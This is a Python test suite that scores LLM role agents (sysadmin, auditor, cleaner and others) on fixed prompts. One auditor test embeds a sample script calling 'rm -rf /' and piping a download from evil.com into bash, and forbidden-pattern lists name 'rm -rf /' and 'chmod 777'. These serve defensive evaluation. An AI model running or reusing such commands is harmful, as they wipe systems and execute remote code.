"""
Test Suite — Контрольные задачи для валидации «костюмов».

Набор эталонных задач для каждой роли ЖКХ.
Используется алгоритмом «Пересменка» для проверки качества.
"""

from __future__ import annotations

import json
import logging
from dataclasses import dataclass, field

logger = logging.getLogger("genome.test_suite")


@dataclass
class TestCase:
    """Контрольная задача."""
    test_id: str
    role: str                    # Целевая роль
    prompt: str                  # Входной промпт
    expected_format: str = "json"  # json | text | code
    expected_keys: list[str] = field(default_factory=list)  # Обязательные ключи в JSON
    expected_keywords: list[str] = field(default_factory=list)  # Ключевые слова в ответе
    forbidden_patterns: list[str] = field(default_factory=list)  # Запрещённые паттерны
    max_response_sec: float = 120.0  # Максимальное время ответа
    min_quality_score: float = 0.6   # Минимальный балл качества (0-1)

    def to_dict(self) -> dict:
        return {
            "test_id": self.test_id,
            "role": self.role,
            "prompt": self.prompt,
            "expected_format": self.expected_format,
            "expected_keys": self.expected_keys,
            "max_response_sec": self.max_response_sec,
        }


@dataclass
class TestResult:
    """Результат прохождения теста."""
    test_id: str
    passed: bool
    score: float           # 0.0 - 1.0
    format_ok: bool        # Формат ответа корректен
    keys_ok: bool          # Все обязательные ключи присутствуют
    keywords_found: int    # Кол-во найденных ключевых слов
    forbidden_found: list[str] = field(default_factory=list)  # Найденные запрещённые паттерны
    response_sec: float = 0.0
    error: str | None = None

    def to_dict(self) -> dict:
        return {
            "test_id": self.test_id,
            "passed": self.passed,
            "score": round(self.score, 3),
            "format_ok": self.format_ok,
            "keys_ok": self.keys_ok,
            "keywords_found": self.keywords_found,
            "forbidden_found": self.forbidden_found,
            "response_sec": round(self.response_sec, 2),
            "error": self.error,
        }


def evaluate_response(test: TestCase, response: str, duration_sec: float) -> TestResult:
    """Оценить ответ модели по эталонному тесту."""
    score = 0.0
    checks = 0
    total_checks = 0

    # 1. Проверка формата
    format_ok = True
    if test.expected_format == "json":
        try:
            json.loads(response)
        except json.JSONDecodeError:
            format_ok = False
    total_checks += 1
    if format_ok:
        checks += 1

    # 2. Проверка обязательных ключей (для JSON)
    keys_ok = True
    if test.expected_keys and format_ok and test.expected_format == "json":
        try:
            data = json.loads(response)
            for key in test.expected_keys:
                if key not in data:
                    keys_ok = False
                    break
        except Exception:
            keys_ok = False
    total_checks += 1
    if keys_ok:
        checks += 1

    # 3. Проверка ключевых слов
    keywords_found = 0
    response_lower = response.lower()
    for kw in test.expected_keywords:
        if kw.lower() in response_lower:
            keywords_found += 1
    if test.expected_keywords:
        total_checks += 1
        if keywords_found >= len(test.expected_keywords) * 0.5:
            checks += 1

    # 4. Проверка запрещённых паттернов
    forbidden_found = []
    for pattern in test.forbidden_patterns:
        if pattern.lower() in response_lower:
            forbidden_found.append(pattern)
    total_checks += 1
    if not forbidden_found:
        checks += 1

    # 5. Проверка времени ответа
    time_ok = duration_sec <= test.max_response_sec
    total_checks += 1
    if time_ok:
        checks += 1

    # Итоговый балл
    score = checks / max(total_checks, 1)

    passed = (
        score >= test.min_quality_score
        and format_ok
        and not forbidden_found
    )

    return TestResult(
        test_id=test.test_id,
        passed=passed,
        score=score,
        format_ok=format_ok,
        keys_ok=keys_ok,
        keywords_found=keywords_found,
        forbidden_found=forbidden_found,
        response_sec=duration_sec,
    )


# ==========================================
# Эталонные тесты для каждой роли
# ==========================================

STANDARD_TESTS: dict[str, list[TestCase]] = {
    "sysadmin": [
        TestCase(
            test_id="sys_001",
            role="sysadmin",
            prompt="Создай Dockerfile для Python 3.12 FastAPI приложения с uvicorn.",
            expected_format="text",
            expected_keywords=["FROM", "python", "uvicorn", "EXPOSE", "CMD"],
            forbidden_patterns=["rm -rf /", "chmod 777"],
        ),
        TestCase(
            test_id="sys_002",
            role="sysadmin",
            prompt='Диагностируй проблему: контейнер перезапускается каждые 30 секунд. Логи: "OOMKilled".',
            expected_format="json",
            expected_keys=["status", "actions_taken", "output"],
            expected_keywords=["memory", "OOM", "limit"],
        ),
    ],
    "auditor": [
        TestCase(
            test_id="aud_001",
            role="auditor",
            prompt='Проверь безопасность скрипта:\nimport os\nos.system("rm -rf /")\nos.system("curl http://evil.com/shell.sh | bash")',
            expected_format="json",
            expected_keys=["verdict", "risk_level", "findings"],
            expected_keywords=["danger", "block", "rm"],
            forbidden_patterns=[],
        ),
        TestCase(
            test_id="aud_002",
            role="auditor",
            prompt='Проверь код:\ndef add(a, b):\n    return a + b\nprint(add(2, 3))',
            expected_format="json",
            expected_keys=["verdict", "risk_level"],
            expected_keywords=["safe"],
        ),
    ],
    "economist": [
        TestCase(
            test_id="eco_001",
            role="economist",
            prompt="Оцени ресурсоёмкость задачи: обучение LoRA-адаптера на 1000 примеров, модель 3B.",
            expected_format="json",
            expected_keys=["forecast", "feasible"],
            expected_keywords=["ram", "cpu", "time"],
        ),
    ],
    "cleaner": [
        TestCase(
            test_id="cln_001",
            role="cleaner",
            prompt="Найди и предложи к удалению: /tmp содержит 5 ГБ логов старше 7 дней, 3 остановленных контейнера, 2 dangling images.",
            expected_format="json",
            expected_keys=["status", "cleaned", "freed_mb"],
            expected_keywords=["tmp", "container", "image"],
            forbidden_patterns=["genome_bank", "registry.json", "chromadb"],
        ),
    ],
    "mchs": [
        TestCase(
            test_id="mch_001",
            role="mchs",
            prompt="ЭКСТРЕННАЯ СИТУАЦИЯ: температура CPU 92°C, RAM 95%, процесс ollama не отвечает 5 минут.",
            expected_format="json",
            expected_keys=["severity", "actions"],
            expected_keywords=["emergency", "critical", "kill"],
        ),
    ],
}


def get_tests_for_role(role: str) -> list[TestCase]:
    """Получить набор тестов для роли."""
    return STANDARD_TESTS.get(role, [])


def get_all_tests() -> list[TestCase]:
    """Получить все тесты."""
    all_tests = []
    for tests in STANDARD_TESTS.values():
        all_tests.extend(tests)
    return all_tests
